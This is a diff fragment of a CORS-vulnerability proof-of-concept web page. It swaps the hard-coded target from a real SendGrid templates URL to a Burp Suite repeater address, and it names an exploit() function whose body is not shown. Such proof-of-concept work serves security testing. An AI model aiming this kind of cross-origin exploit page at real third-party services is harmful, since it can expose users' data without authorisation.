@@ -6,14 +6,14 @@
 </head>
 <body>
     <h1>CORS Vulnerability - Proof of Concept</h1>
-    <p>Targeting: <code id="target-url">https://mc.sendgrid.com/dynamic-templates</code></p>
+    <p>Targeting: <code id="target-url">http://burpsuite/repeat/1/f23no78tezeaoxy7gry22hcxzugxxbj4</code></p>
     
     <div id="result" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">
         Waiting for response...
     </div>
 
     <script>
-        const target = "https://mc.sendgrid.com/dynamic-templates";
+        const target = "http://burpsuite/repeat/1/f23no78tezeaoxy7gry22hcxzugxxbj4";
         document.getElementById('target-url').innerText = target;
 
         function exploit() {
